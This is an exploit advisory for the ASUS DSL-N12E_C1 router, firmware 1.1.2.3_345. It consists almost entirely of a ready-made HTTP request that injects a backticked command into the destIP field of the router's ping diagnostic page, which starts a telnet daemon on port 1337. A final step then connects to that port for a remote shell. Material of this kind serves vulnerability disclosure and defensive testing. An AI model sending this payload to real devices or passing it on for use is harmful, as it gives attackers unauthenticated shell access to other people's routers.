Exploit Title: ASUS DSL-N12E_C1 1.1.2.3_345 - Remote Command Execution<br>
Date: 2018-08-02<br>
Exploit Author: Fakhri Zulkifli (@d0lph1n98)<br>
Vendor Homepage: https://www.asus.com/<br>
Software Link: https://www.asus.com/Networking/DSLN12E_C1/HelpDesk_BIOS/<br>
Version: 1.1.2.3_345<br>
Tested on: 1.1.2.3_345<br>

GET /Main_Analysis_Content.asp?current_page=Main_Analysis_Content.asp&next_page=Main_Analysis_Content.asp&next_host=www.target.com&group_id=&modified=0&action_mode=+Refresh+&action_script=&action_wait=&first_time=&applyFlag=1&preferred_lang=EN&firmver=1.1.2.3_345-g987b580&cmdMethod=ping&destIP=%60utelnetd+-p+1337%60&pingCNT=5 HTTP/1.1<br>
Host: www.target.com<br>
Connection: keep-alive<br>
Pragma: no-cache<br>
Cache-Control: no-cache<br>
Upgrade-Insecure-Requests: 1<br>
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36<br>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8<br>
Referer: http://www.target.com/Main_Analysis_Content.asp<br>
Accept-Encoding: gzip, deflate<br>
Accept-Language: en-US,en;q=0.9<br>

To connect<br>
1. telnet www.target.com 1337